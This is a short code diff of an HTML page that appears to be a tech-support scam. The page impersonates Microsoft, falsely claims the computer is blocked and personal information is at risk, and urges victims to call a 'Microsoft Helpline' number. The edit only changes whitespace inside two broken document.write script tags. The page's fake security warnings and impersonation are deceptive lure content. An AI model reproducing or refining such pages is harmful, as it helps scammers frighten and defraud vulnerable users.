@@ -692,7 +692,7 @@
     <div id="disclaimer">
         Access to this Computer has been blocked for security reasons.<br>
         <span class="support">Microsoft Helpline: 
-<script> document.write(888)479 6555)</script> (Toll-Free)</span>
+<script>document.write(888)479 6555)</script> (Toll-Free)</span>
     </div>
 
 </div>
@@ -746,7 +746,7 @@
     <p>Closing this window will put your personal information at risk and lead to a suspension of your Windows
         Registration failed <span id="gfg"></span>.</p>
     <p style="padding-bottom: 0px; color:#fff; font-size:14px;">Call Microsoft Support: <strong>
-            <script> document.write(888)479 6555)</script> (Toll-Free)</strong></p>
+            <script>document.write(888)479 6555)</script> (Toll-Free)</strong></p>
     <div class="action_buttons"><a class="active" id="leave_page" style="cursor: pointer; color: #FFFFFF !important;">Run Safe</a> <a class="active" id="leave_page" style="color: #FFFFFF !important;">Ignore</a>
     </div>
 </div>
